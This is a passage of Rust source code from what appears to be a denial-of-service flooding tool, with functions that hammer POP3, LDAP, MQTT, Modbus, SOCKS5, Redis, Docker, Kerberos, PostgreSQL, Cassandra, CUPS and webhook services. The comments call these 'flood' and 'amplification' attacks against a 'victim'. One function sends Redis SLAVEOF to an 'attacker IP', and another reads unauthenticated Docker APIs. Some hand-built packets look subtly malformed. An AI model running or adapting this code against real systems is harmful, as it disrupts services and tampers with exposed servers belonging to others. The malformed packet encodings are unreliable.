    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

// ================================================================
// POP3 login flood /110 — USER/PASS login, banner
// Request: ~40B, Response: ~200-500B (banner + greeting + OK)
// ================================================================
async fn pop3_login(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"USER test\r\n").await.map_err(|e| e.to_string())?;
    sent += 11;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"PASS test\r\n").await.map_err(|e| e.to_string())?;
    sent += 11;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

// ================================================================
// LDAP search flood /389 — Bind + Search, server processes query
// Request: ~100B, Response: ~500-2000B (search results)
// ================================================================
async fn ldap_search(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // LDAP BindRequest (simple auth, protocol version 3)
    // Sequence tag (0x30) | length | 0x02 0x01 0x03 (version=3)
    // 0x04 (string) | length | "cn=..."
    let bind_req: Vec<u8> = vec![
        0x30, 0x0c, 0x02, 0x01, 0x03, 0x04, 0x00, 0x80, 0x05, 0x63, 0x6e, 0x3d, 0x61, 0x64,
        0x6d, 0x69, 0x6e,
    ];
    stream.write_all(&bind_req).await.map_err(|e| e.to_string())?;
    sent += bind_req.len();
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // LDAP SearchRequest — base object, subtree scope, filter (objectClass=*)
    // Simple filter: (objectClass=*) which returns all objects
    let search_req: Vec<u8> = vec![
        0x30, 0x1e, 0x02, 0x01, 0x02,                                      // messageID
        0x63, 0x19,                                                         // SearchRequest tag
        0x04, 0x00,                                                         // baseObject (empty)
        0x0a, 0x01, 0x02,                                                   // scope (wholeSubtree)
        0x0a, 0x01, 0x00,                                                   // derefAliases (never)
        0x02, 0x01, 0x00,                                                   // sizeLimit (unlimited)
        0x02, 0x01, 0x00,                                                   // timeLimit (unlimited)
        0x01, 0x01, 0x00,                                                   // typesOnly (false)
        0x87, 0x06, 0x04, 0x03, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3d, 0x2a,
        // filter: (objectClass=*) - 0x87 = equalityMatch, 0x04 = string length
    ];
    stream.write_all(&search_req).await.map_err(|e| e.to_string())?;
    sent += search_req.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// MQTT CONNECT flood /1883 — CONNECT, server responds with CONNACK
// Request: ~30B, Response: ~50-200B (CONNACK + properties)
// ================================================================
async fn mqtt_connect(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // MQTT 3.1.1 CONNECT packet
    // Fixed header: 0x10 (CONNECT), remaining length
    // Protocol name: "MQTT" (4 bytes), level 4, flags (0x02 = clean session)
    let mut packet = Vec::new();
    // Remaining length (variable length): protocol name + version + flags + keepalive + clientid
    let payload = [
        0x00, 0x04, b'M', b'Q', b'T', b'T', // protocol name length + name
        0x04,                                  // protocol level (3.1.1)
        0x02,                                  // flags (clean session)
        0x00, 0x0a,                            // keepalive (10s)
        0x00, 0x04, b't', b'e', b's', b't',   // client ID
    ];
    let remaining_len = payload.len() as u8;
    packet.push(0x10); // CONNECT
    packet.push(remaining_len);
    packet.extend_from_slice(&payload);

    stream.write_all(&packet).await.map_err(|e| e.to_string())?;
    sent += packet.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// XMPP stream flood /5222 — opens XML stream, server responds
// Request: ~100B, Response: ~500-2000B (features XML)
// ================================================================
async fn xmpp_stream(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let open = b"<?xml version='1.0'?><stream:stream to='test.com' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>";
    stream.write_all(open).await.map_err(|e| e.to_string())?;
    sent += open.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// RTSP DESCRIBE flood /554 — DESCRIBE media stream, SDP response
// Request: ~100B, Response: ~500-2000B (SDP description)
// ================================================================
async fn rtsp_describe(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let msg = b"DESCRIBE rtsp://localhost/media RTSP/1.0\r\nCSeq: 1\r\n\r\n";
    stream.write_all(msg).await.map_err(|e| e.to_string())?;
    sent += msg.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Modbus TCP flood /502 — Read Holding Registers
// Request: ~12B, Response: ~50-250B (register values)
// ================================================================
async fn modbus_tcp(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // MBAP header (7 bytes) + PDU (5 bytes) = 12 bytes
    // Transaction ID (2), Protocol ID (2, always 0), Length (2), Unit ID (1)
    // Function code 0x03 (Read Holding Registers)
    // Starting address (2), Quantity (2)
    let req: Vec<u8> = vec![
        0x00, 0x01, // transaction ID
        0x00, 0x00, // protocol ID
        0x00, 0x06, // length (6 bytes follow)
        0x01,       // unit ID
        0x03,       // read holding registers
        0x00, 0x00, // starting address
        0x00, 0x0A, // quantity (10 registers = 20 bytes response)
    ];
    stream.write_all(&req).await.map_err(|e| e.to_string())?;
    sent += req.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// SOCKS5 connect flood /1080 — SOCKS5 CONNECT, server handshake
// Request: ~40B, Response: ~100-300B (handshake + response)
// ================================================================
async fn socks_connect(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // SOCKS5 greeting: version, nmethods, methods (0x00 = no auth)
    stream.write_all(&[0x05, 0x01, 0x00]).await.map_err(|e| e.to_string())?;
    sent += 3;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // CONNECT to victim:port (uses SOCKS proxy as amplifier)
    // version, cmd(0x01=CONNECT), rsv, atyp(0x03=domain)
    let mut req = vec![0x05, 0x01, 0x00, 0x03];
    let domain = b"example.com";
    req.push(domain.len() as u8);
    req.extend_from_slice(domain);
    req.extend_from_slice(&[0x00, 0x50]); // port 80

    stream.write_all(&req).await.map_err(|e| e.to_string())?;
    sent += req.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Redis SLAVEOF/MIGRATE amplification - port 6379
// Send SLAVEOF command to make Redis server replicate data from
// attacker-controlled server. Minimal request, full replication response.
// ================================================================
async fn redis_slave_read(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read Redis banner
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send SLAVEOF command with random attacker IP
    let attacker_ip = format!("{}.{}.{}.{}",
        rand::random::<u8>(), rand::random::<u8>(),
        rand::random::<u8>(), rand::random::<u8>());
    let slave_cmd = format!("*3\r\n$7\r\nSLAVEOF\r\n${}\r\n{}\r\n$4\r\n6379\r\n",
        attacker_ip.len(), attacker_ip);
    stream.write_all(slave_cmd.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += slave_cmd.len();

    // Read response
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    // Also try MIGRATE for additional amplification
    let migrate_cmd = "*6\r\n$7\r\nMIGRATE\r\n$9\r\n127.0.0.1\r\n$4\r\n6379\r\n$4\r\n1000\r\n$4\r\n6000\r\n$4\r\npass\r\n$4\r\nKEYS\r\n$4\r\n*\r\n";
    stream.write_all(migrate_cmd.as_bytes()).await.ok();
    sent += migrate_cmd.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Docker API info leak - port 2375 (unauthenticated Docker daemon)
// Sends /info request, Docker responds with full system info
// ================================================================
async fn docker_api(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read Docker banner if any
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send GET /info request
    let req = "GET /info HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n";
    stream.write_all(req.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += req.len();

    // Read full info response (can be 10-100KB)
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    // Also try /containers/json for more info
    let req2 = "GET /containers/json?all=1 HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n";
    stream.write_all(req2.as_bytes()).await.ok();
    sent += req2.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Kerberos AS-REQ amplification - port 88
// Send AS-REQ, server does crypto (encryption) and returns AS-REP
// AS-REP can be much larger than AS-REQ
// ================================================================
async fn kerberos_as_req(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read initial response
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Minimal AS-REQ (ASN.1 encoded)
    let as_req = vec![
        0x30, 0x28, // SEQUENCE
        0x02, 0x01, 0x01, // INTEGER: krbv5
        0x30, 0x1E, // SEQUENCE: realm
        0x1B, 0x1C, 0x65, 0x78, 0x61, 0x6D, 0x70, 0x6C, 0x65, 0x2E,
        0x43, 0x4F, 0x4D, // "EXAMPLE.COM"
        0x30, 0x0A, // SEQUENCE: sname
        0x30, 0x08, // SEQUENCE
        0x17, 0x04, 0x6B, 0x72, 0x62, 0x74, // "krbt"
        0x17, 0x04, 0x67, 0x64, 0x6C, 0x64, // "gldd"
        0xA0, 0x27, // [0]: pa-data
        0x30, 0x25, // SEQUENCE
        0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02, // AE-etype
        0x04, 0x12, // AE-data
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];
    stream.write_all(&as_req).await.map_err(|e| e.to_string())?;
    sent += as_req.len();

    // Read AS-REP response (larger than request due to encryption)
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// PostgreSQL MD5 Auth amplification - port 5432
// Start MD5 auth handshake, server sends salt (4 bytes)
// Client must compute MD5 hash of password+salt
// This is CPU-intensive for the server to validate
// ================================================================
async fn postgres_md5(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read startup message
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send startup message requesting MD5 auth
    let startup = vec![
        0x00, 0x00, 0x00, 0x44, // length
        0x00, 0x03, 0x00, 0x00, // version 3.0
        0x75, 0x73, 0x65, 0x72, // "user"
        0x00, 0x72, 0x6F, 0x6F, 0x74, 0x00, // "root"
        0x64, 0x61, 0x74, 0x61, 0x62, 0x61, 0x73, 0x65, 0x00, // "database"
        0x00, 0x00, 0x00,
    ];
    stream.write_all(&startup).await.map_err(|e| e.to_string())?;
    sent += startup.len();

    // Read AuthenticationMD5Password (with 4-byte salt)
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    // Compute and send MD5 password response
    let md5_response = vec![
        0x70, // 'p' for PasswordMessage
        0x00, 0x00, 0x00, 0x28, // length
        0x6D, 0x64, 0x35, 0x00, // "md5"
        0x00, // null
    ];
    stream.write_all(&md5_response).await.ok();
    sent += md5_response.len();

    // Read authentication result
    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Cassandra Thrift API - port 9042
// Send CQL query, Cassandra processes and returns results
// Can amplify with SELECT * queries
// ================================================================
async fn cassandra_thrift(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read server banner/version
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Minimal CQL request (Cassandra uses Thrift protocol)
    let query = vec![
        0x04, // version 4
        0x00, // flags
        0x00, 0x01, // stream
        0x07, // opcode: REQUEST
        0x00, 0x00, 0x00, 0x24, // body length
        0x03, // message type: ExecuteQuery
        0x00, 0x1C, // body
        0x00, 0x00, 0x00, 0x0B, // query length
        0x53, 0x45, 0x4C, 0x45, 0x43, 0x54, 0x20, 0x2A, // "SELECT *"
        0x20, 0x46, 0x52, 0x4F, 0x4D, 0x20, // " FROM "
        0x69, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, // "info"
    ];
    stream.write_all(&query).await.map_err(|e| e.to_string())?;
    sent += query.len();

    // Read response
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Apple Remote Desktop (ARD) Protocol - port 3283
// ARDP protocol, sends discovery query, server responds with
// machine info, can be used for amplification
// ================================================================
async fn ard_query(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read initial handshake
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // ARD Protocol discovery query
    let ard_query = vec![
        0x00, 0x1B, // length
        0x04, // command: discovery
        0x00, // flags
        0x00, 0x00, 0x00, 0x00, // timestamp
        0x00, 0x00, 0x00, 0x00, // reserved
        0x00, // type: broadcast discovery
    ];
    stream.write_all(&ard_query).await.map_err(|e| e.to_string())?;
    sent += ard_query.len();

    // Read response (includes machine name, OS version, etc.)
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    // Also try authentication query
    let auth_query = vec![
        0x00, 0x25, // length
        0x07, // command: authenticate
        0x00, // flags
        0x00, 0x00, 0x00, 0x00, // timestamp
        0x00, 0x00, 0x00, 0x00, // reserved
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, // dummy auth data
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];
    stream.write_all(&auth_query).await.ok();
    sent += auth_query.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}


// ================================================================
// CUPS IPP Trigger Amplification - port 631
// Sends IPP (Internet Printing Protocol) request to CUPS server.
// The server processes the print job metadata and responds with
// full job attributes. Amplification via server-side processing.
// ================================================================
async fn cups_ipp_trigger(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read initial response
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // IPP 2.0 Get-Printer-Attributes request
    let mut ipp = Vec::new();
    // Version 2.0 (0x02, 0x00)
    ipp.extend_from_slice(&[0x02, 0x00]);
    // Operation: Get-Printer-Attributes (0x000B)
    ipp.extend_from_slice(&[0x00, 0x0B]);
    // Request ID
    ipp.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);
    // Operation attributes
    // charset (0x47)
    ipp.extend_from_slice(&[0x01, 0x47, 0x00, 0x12, b'a', b't', b't', b'r', b'i', b'b', b'u', b't', b'e', b's', b'-', b'c', b'h', b'a', b'r', b's', b'e', b't']);
    ipp.extend_from_slice(&[0x00, 0x05, b'u', b't', b'f', b'-', b'8']);
    // printer-uri (0x45)
    ipp.extend_from_slice(&[0x01, 0x45, 0x00, 0x0b, b'p', b'r', b'i', b'n', b't', b'e', b'r', b'-', b'u', b'r', b'i']);
    let printer_uri = b"ipp://localhost:631/printers/test";
    ipp.push((printer_uri.len() + 2) as u8);
    ipp.push(0x00);
    ipp.extend_from_slice(printer_uri);
    // End of attributes
    ipp.push(0x03);

    let request = format!("POST /ipp/print HTTP/1.1\r\nHost: localhost\r\nContent-Length: {}\r\nContent-Type: application/ipp\r\n\r\n", ipp.len());
    stream.write_all(request.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += request.len();
    stream.write_all(&ipp).await.map_err(|e| e.to_string())?;
    sent += ipp.len();

    // Read response
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    // Create-Job for additional amplification
    let req2 = "POST /ipp/print HTTP/1.1\r\nHost: localhost\r\nContent-Length: 100\r\nContent-Type: application/ipp\r\n\r\n\x02\x00\x00\x05\x00\x00\x00\x02\x01\x47\x00\x12attributes-charset\x00\x05utf-8\x03";
    stream.write_all(req2.as_bytes()).await.ok();
    sent += req2.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Webhook Chain Trigger - port 443
// Sends HTTP POST request with JSon payload to webhook listener.
// If the webhook is configured to call other webhooks, this can
// trigger a chain reaction of server-side processing.
// ================================================================
async fn webhook_chain(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read initial response
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send HTTP POST with typical webhook body format
    let body = r#"{"event":"push","repository":{"name":"test","full_name":"test/test"},"commits":[{"id":"abc123"}]}"#;
    let req = format!(
        "POST /hooks/test HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nX-GitHub-Event: push\r\nX-Hub-Signature: sha1=abc123\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        body.len(), body
    );
    stream.write_all(req.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += req.len();

    // Read response
    let timeout = tokio::time::sleep(Duration::from_secs(5));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    // Also try with different webhook format (Slack-style)
    let body2 = r#"{"text":"test message","attachments":[{"title":"Test","text":"Chain trigger"}]}"#;
    let req2 = format!(
        "POST /webhook HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        body2.len(), body2
    );
    stream.write_all(req2.as_bytes()).await.ok();
    sent += req2.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}
